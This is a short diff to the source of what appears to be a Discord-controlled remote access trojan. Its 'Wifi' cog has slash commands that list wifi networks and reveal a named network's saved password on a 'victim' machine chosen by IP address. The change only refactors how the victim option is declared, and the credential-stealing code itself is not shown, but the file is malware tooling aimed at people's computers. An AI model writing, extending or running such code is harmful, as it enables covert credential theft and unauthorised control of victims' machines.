@@ -12,9 +12,7 @@ class Wifi(commands.Cog):
         
     @commands.slash_command(
         description="Lists all wifi networks",
-        options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
-        ]
+        options=[self.bot.victim]
     )
     async def wifilist(self, ctx, victim):
         if str(victim) == str(self.ip_addr):
@@ -45,7 +43,7 @@ class Wifi(commands.Cog):
     @commands.slash_command(
         description="Lists specified wifi password",
         options=[
-            discord.Option("victim", description="IP Address of specific victim", required=True),
+            self.bot.victim,
             discord.Option("ssid", description="The name of the WIFI", required=True),
         ]
     )
